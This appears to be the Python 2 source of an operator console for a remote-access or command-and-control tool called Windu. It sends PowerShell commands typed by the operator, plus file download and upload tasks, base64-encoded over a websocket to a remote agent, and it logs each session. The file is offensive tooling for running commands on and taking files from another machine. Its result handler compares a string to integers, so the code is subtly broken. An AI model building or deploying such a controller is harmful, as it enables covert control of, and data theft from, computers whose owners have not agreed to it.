import base64
import os, time, sys, datetime, time
import glob
from pydispatch import dispatcher
import cmd
import Main

class GoToMain(Exception):
	'''Exception handling for going to the main menu'''
	pass

class WinduClientMenu(cmd.Cmd):
	"""docstring for WinduClientMenu"""
	def __init__(self, websocket, clientName, clientUser, main):
		cmd.Cmd.__init__(self)

		self.prompt = "%s@%s > " % (clientUser, clientName)
		self.do_help.__func__.__doc__ = '''Displays the help menu.'''
		self.ws = websocket
		self.clientName = clientName
		self.clientUser = clientUser
		self.main = main
		self.menu_state = "client"
		self.sessionLogFile = "sessionLog-%s-%s-%s.txt" % (self.clientName,self.clientUser,time.strftime("%d%m%Y"))
		dispatcher.connect(self.handle_event, sender=dispatcher.Any)

	def handle_event(self, signal, sender):
		'''Handle events for new clients connecting'''

		print "[!] %s" % (signal)

	def preloop(self):
		"""Initialize the history var"""
		self._hist = {}
		cmd.Cmd.preloop(self)

	def postloop(self):
		"""Print exiting message"""
		cmd.Cmd.postloop(self)
		print "Leaving Websocket session..."

	def cmdloop(self, intro=None):
		"""If there is a keyboard interrupt, ask to background"""
		while True:
			try:
				if self.menu_state == "main":
					self.do_back('')
				else:
					cmd.Cmd.cmdloop(self)

			except KeyboardInterrupt:
				self.menu_state = "main"
				try:
					background = raw_input("Background WinduClient session (Y/N)?")
					if background.lower() == 'y':
						return True
					elif background.lower() == 'n':
						continue
				except KeyboardInterrupt as e:
					raise e
			except GoToMain as e:
				self.menu_state = "main"


	def default(self, line):
		"Default command. Commands entered here will be sent to the PowerShell prompt"
		#YOLO send the command to the powershell client
		task = "\x00|"+line
		self.sendNewTask(task)

	def do_download(self, line):
		"""Download a file from the client"""
		line = line.strip()
		task = "\x01|"+line
		self.sendNewTask(task)

	def do_upload(self, line):
		"""Upload a file"""
		line = line.strip()
		if os.path.exists(line):
			task = "\x02|"
			f = open(line, 'r')
			filename = os.path.basename(line)
			data = f.read()
			data += "|"+filename
			task += data
			self.sendNewTask(task)
		else:
			print "local file does not exist\n"
			pass

	def do_dumphistory(self, line):
		'''Dump history saved to the history dictionary'''
		history = ""
		for time, command in self._hist.iteritems():
			history += "%s %s\n" % (time, command)

		print history

	def do_back(self, line):
		'''Background the current session and go to the main menu'''
		try:
			winduMain = Main.Menu()
			winduMain.cmdloop()
		except Exception as e:
			raise e

	def do_exit(self, line):
		'''Exit the current WinduSocketSession'''
		self.ws.close()
		raise GoToMain()

	def emptyline(self):
		pass

	def precmd(self, line):
		"""Add the command to history dictionary and also to file"""
		if not os.path.exists(self.sessionLogFile):
			f = open(self.sessionLogFile, 'w+')
			f.write('\n')
			f.close()

		f = open(self.sessionLogFile, 'a+')
		ts = time.time()
		st = datetime.datetime.fromtimestamp(ts).strftime('%Y-%m-%d_%H:%M:%S')
		f.write("%s:%s\r\n" % (st, line))
		f.close()
		self._hist[st] = line
		return line

	def sendNewTask(self, data):
		'''Send base64 encoded task to client'''
		encData = base64.b64encode(data)
		self.ws.send(encData)

		encodedData = self.ws.receive()
		clientData = base64.b64decode(encodedData)
		self.handleData(clientData)

	def handleData(self, data):
		'''Handle agent results'''
		
		taskID = data[0]
		taskData = data[5:]

		if taskID == 0:
			'''Command shell'''
			try:
				print str(taskData.decode('ascii')) + '\n'
			except Exception:
				pass

		elif taskID == 1:
			'''File Download'''
			fileData, fileName = taskData.split('|')
			fileName = fileName.decode('ascii')
			f = open(fileName, 'wb')
			f.write(base64.b64decode(fileData))
			f.close()
			print "File saved to %s" % (os.path.abspath(fileName))
		elif taskID == 2:
			'''File upload'''
			print "File upload successful\n"
		else:
			print "command failed\n"


